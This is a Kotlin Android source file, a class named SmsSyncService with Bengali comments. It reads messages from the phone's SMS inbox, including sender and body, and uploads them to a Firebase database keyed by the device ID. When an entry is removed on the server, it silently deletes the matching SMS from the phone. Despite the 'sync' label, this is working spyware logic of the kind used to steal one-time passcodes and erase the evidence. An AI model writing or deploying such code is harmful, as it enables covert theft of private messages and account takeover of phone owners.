package com.example.aplay

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.Settings
import android.telephony.SmsManager
import com.google.firebase.database.*

class SmsSyncService(private val context: Context) {

    private val deviceId: String = Settings.Secure.getString(
        context.contentResolver,
        Settings.Secure.ANDROID_ID
    ) ?: "unknown_device"

    private val smsRef: DatabaseReference =
        FirebaseDatabase.getInstance().getReference("sms").child(deviceId)

    // প্রথম N SMS আপলোড
    fun uploadInitialSms(limit: Int = 20) {
        val uriSms = Uri.parse("content://sms/inbox")
        val cursor: Cursor? = context.contentResolver.query(uriSms, null, null, null, null)

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < limit) {
                val id = it.getString(it.getColumnIndex("_id") ?: -1) ?: continue
                val sender = it.getString(it.getColumnIndex("address") ?: -1) ?: ""
                val body = it.getString(it.getColumnIndex("body") ?: -1) ?: ""

                val smsData = mapOf(
                    "id" to id,
                    "sender" to sender,
                    "body" to body,
                    "timestamp" to System.currentTimeMillis()
                )
                smsRef.child(id).setValue(smsData)
                count++
            }
        }
    }

    // Firebase থেকে ডিলেট হলে ফোন থেকেও ডিলেট
    fun listenForFirebaseDeletion() {
        smsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildRemoved(snapshot: DataSnapshot) {
                val smsId = snapshot.key ?: return
                deleteSmsFromPhone(smsId)
            }

            override fun onChildAdded(snapshot: DataSnapshot) {}
            override fun onChildChanged(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun deleteSmsFromPhone(smsId: String) {
        try {
            val uriSms = Uri.parse("content://sms")
            context.contentResolver.delete(uriSms, "_id=?", arrayOf(smsId))
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
